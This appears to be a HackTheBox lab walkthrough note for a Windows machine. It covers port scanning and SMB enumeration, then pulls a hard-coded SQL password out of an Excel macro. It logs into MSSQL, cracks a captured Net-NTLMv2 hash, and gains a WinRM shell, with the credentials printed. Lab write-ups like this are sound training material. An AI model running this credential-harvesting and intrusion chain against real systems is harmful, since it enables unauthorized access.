# Recon & Enum

### Rustscan & Nmap
```bash
awk -F: '{print $2}' rustscan.txt | paste -sd ","

sudo nmap -sC -sV -oA nmap -p 135,139,445,1433,5985,47001,49664,49666,49665,49669,49667,49668,49671,49670 $IP
```

### SMB
```bash
smbclient -N -L \\\\$IP

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        Reports         Disk      
SMB1 disabled -- no workgroup available

smbclient \\\\$IP\\Reports
Password for [WORKGROUP\alvin]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Tue Jan 29 12:23:48 2019
  ..                                  D        0  Tue Jan 29 12:23:48 2019
  Currency Volume Report.xlsm         A    12229  Mon Jan 28 11:21:34 2019

pipx install oletools
  installed package oletools 0.60.1, installed using Python 3.11.6
  These apps are now globally available
    - ezhexviewer
    - ftguess
    - mraptor
    - msodde
    - olebrowse
    - oledir
    - olefile
    - oleid
    - olemap
    - olemeta
    - oleobj
    - oletimes
    - olevba
    - pyxswf
    - rtfobj
done! ✨ 🌟 ✨

olevba Currency\ Volume\ Report.xlsm

conn.ConnectionString = "Driver={SQL Server};Server=QUERIER;Trusted_Connection=no;Database=volume;Uid=reporting;Pwd=PcwTWTHRwryjc$c6"
```

### MSSQL
```bash
impacket-mssqlclient reporting@$IP
Impacket v0.11.0 - Copyright 2023 Fortra

Password:
[*] Encryption required, switching to TLS
[-] ERROR(QUERIER): Line 1: Login failed for user 'reporting'.

impacket-mssqlclient reporting@$IP -windows-auth
Impacket v0.11.0 - Copyright 2023 Fortra

Password:
[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: volume
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(QUERIER): Line 1: Changed database context to 'volume'.
[*] INFO(QUERIER): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (140 3232) 
[!] Press help for extra shell commands
SQL (QUERIER\reporting  reporting@volume)> xp_cmdshell
[-] ERROR(QUERIER): Line 1: The EXECUTE permission was denied on the object 'xp_cmdshell', database 'mssqlsystemresource', schema 'sys'.
SQL (QUERIER\reporting  reporting@volume)> EXECUTE sp_configure 'show advanced options', 1
[-] ERROR(QUERIER): Line 105: User does not have permission to perform this action.
```

### Get Net-NTLMv2
* https://github.com/A1vinSmith/OSEP/tree/main/HTB/Windows/Escape#get-net-ntlmv2

```bash
MSSQL-SVC::QUERIER:aaaaaaaaaaaaaaaa:cb7a897345aae220832f30d0a7e9209a:010100000000000000803f1dda1cda016aaf983218bfd25a000000000100100078004c0045004f0059004200770066000300100078004c0045004f005900420077006600020010004f0049004300790050006a0051004b00040010004f0049004300790050006a0051004b000700080000803f1dda1cda01060004000200000008003000300000000000000000000000003000003349fde686d4a923ba2976234351f1203580a4150fba6ac04a1b523f3b5ab5ec0a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310036002e0031003200000000000000000000000000:corporate568
```

`evil-winrm -i $IP -u MSSQL-SVC -p corporate568`